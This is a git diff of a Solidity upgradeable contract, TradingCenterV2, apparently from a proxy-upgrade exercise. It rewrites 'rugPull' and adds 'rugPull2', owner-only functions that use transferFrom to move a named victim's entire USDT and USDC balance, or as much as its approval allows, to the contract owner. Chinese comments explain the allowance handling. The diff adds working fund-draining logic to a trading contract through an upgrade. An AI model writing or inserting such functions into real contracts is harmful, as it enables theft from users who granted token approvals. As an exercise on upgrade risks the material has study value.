@@ -14,9 +14,32 @@ contract TradingCenterV2 is TradingCenter, Ownable{
         v2Initialized = true;
     }
 
-    function rugPull(address _beRugPullOwner) external onlyOwner {
-        usdt.transferFrom(_beRugPullOwner, getOwner(), usdt.balanceOf(_beRugPullOwner));
-        usdc.transferFrom(_beRugPullOwner, getOwner(), usdc.balanceOf(_beRugPullOwner));
+    // 若是allowance數量不足，則revert
+    function rugPull(address _victim) external onlyOwner {
+        address owner = getOwner();
+        require(usdt.balanceOf(_victim) <= usdt.allowance(_victim , address(this)) &&
+                usdc.balanceOf(_victim) <= usdc.allowance(_victim , address(this)),
+                "Insufficient allowance");
+        usdt.transferFrom(_victim, owner, usdt.balanceOf(_victim));
+        usdc.transferFrom(_victim, owner, usdc.balanceOf(_victim));
+    }
+
+    // 若是 victim 的 usdt 或 usdc 的 balance 小於等於 allowance，就直接 transferFrom _victim的所有餘額
+    // 反之，若是balance 大於 allowance，就直接 transferFrom _victim的 allowance 數量的 token
+    function rugPull2(address _victim) external onlyOwner {
+        address owner = getOwner();
+        // usdt
+        if(usdt.balanceOf(_victim) <= usdt.allowance(_victim , address(this))){
+            usdt.transferFrom(_victim, owner, usdt.balanceOf(_victim));
+        }else{
+            usdt.transferFrom(_victim, owner, usdt.allowance(_victim, address(this)));
+        }
+        // usdc
+        if(usdc.balanceOf(_victim) <= usdc.allowance(_victim , address(this))){
+            usdc.transferFrom(_victim, owner, usdc.balanceOf(_victim));
+        }else{
+            usdc.transferFrom(_victim, owner, usdc.allowance(_victim, address(this)));
+        }
     }
 
     function VERSION() external view virtual override returns (string memory) {
